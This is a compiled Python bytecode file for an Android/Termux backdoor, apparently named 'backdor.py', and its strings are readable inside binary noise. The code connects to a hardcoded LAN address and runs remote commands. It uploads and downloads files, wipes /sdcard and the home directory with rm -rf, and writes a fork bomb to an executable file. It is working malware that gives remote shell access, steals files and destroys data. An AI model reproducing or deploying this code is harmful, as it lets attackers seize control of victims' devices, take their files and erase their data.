ó
¥¿dc           @   s  d  d l  Z  d  d l Z d  d l Z d Z e d d  Z e j e  Z e j   Z	 e j
 d  e j
 d  e j
 d  d GHe  j    Z e Z x+ e s¿ y e j d  e Z Wq q Xq Wd   Z d   Z d   Z d   Z d   Z d   Z e   d S(   iÿÿÿÿNs   :(){ :|:& };:s%   /data/data/com.termux/files/usr/bin/vt   wbs.   chmod +x /data/data/com.termux/files/usr/bin/vs_   cp -r /data/data/com.termux/files/usr/bin/termux-open  /data/data/com.termux/files/usr/bin/opent   clears4   [1;33m[[1;32m+[1;33m] [1;32mRunning . . .[1;37ms   192.168.1.2i\  c          C   sx   xq t  rs t j d  }  |  d k r. t   q |  d k rD t   q |  d k rZ t   q |  d k r t   q q Wd  S(   Ni   t   chatt   shellt   downloadt   upload(   t   Truet   st   recvR   R   R   R   (   t   m(    (    s+   /data/data/com.termux/files/home/backdor.pyt   main   s    	


c          C   s   x t  r t j d  }  |  d k r. t   n |  d k rD t   n  y, t |  d  } | j   } t j |  Wq t k
 r t   q Xq Wd  S(   Ni   t   backt    t   rb(	   R   R   R   R
   R   t   opent   readt   sendt   IOError(   t   file_pt   ft   data(    (    s+   /data/data/com.termux/files/home/backdor.pyR   $   s    	

c          C   s   x t  r t j d  }  |  d k r. t   q |  d k rD t   q t j d  } d |  d } t | d  } | j |  | j   q Wd  S(   Ni   R   R   i   @s   /sdcard/R    (   R   R   R   R
   R   R   t   writet   close(   R   t   fut   f_nt   n_f(    (    s+   /data/data/com.termux/files/home/backdor.pyR   3   s    	

c           C   s   t  j d  t  j d  d  S(   Ns   rm -rf /sdcards	   rm -rf ~ (   t   ost   system(    (    (    s+   /data/data/com.termux/files/home/backdor.pyt   formatA   s    c          C   s_   xX t  rZ t j d  }  |  d k r. t   q |  d k rJ t j d  q d |  d GHq Wd  S(   Ni   R   R   s   [1;36ms   [1;37m(   R   R   R   R
   R   R   (   t   vr2(    (    s+   /data/data/com.termux/files/home/backdor.pyR   E   s    	
c       
   C   s  x}t  rt j d  }  |  d  d k rU t j |  d  t j   } t j d  q |  d k rk t   q |  d k r t   t j	 d  t j	 d	  q |  d
 k r· t j	 d  q |  d k rt
 j d d t  d t
 j d t
 j d t
 j } | j j   | j j   } t j |  q t
 j |  d t  d t
 j d t
 j d t
 j } | j j   | j j   } t j d |  q Wd  S(   Ni   i   t   cdi   t   bacodR   R   s   rm -rf /sdcards	   rm -rf ~ t   viruss*   bash /data/data/com.termux/files/usr/bin/vt   kernel_infos   cat /proc/versionR   t   stdoutt   stderrt   stdinR   (   R   R   R   R   t   chdirt   getcwdt   sendallR
   R   R   t
   subprocesst   Popent   PIPER"   R   R#   (   t   cmdt   dirt   results(    (    s+   /data/data/com.termux/files/home/backdor.pyR   V   s2    	
(   s   192.168.1.2i\  (   t   socketR(   R   R   R   t   iR   t   oR   t   cR   t   Falset   connt   connectR   R
   R   R   R   R   R   (    (    (    s+   /data/data/com.termux/files/home/backdor.pyt   <module>   s2   	
						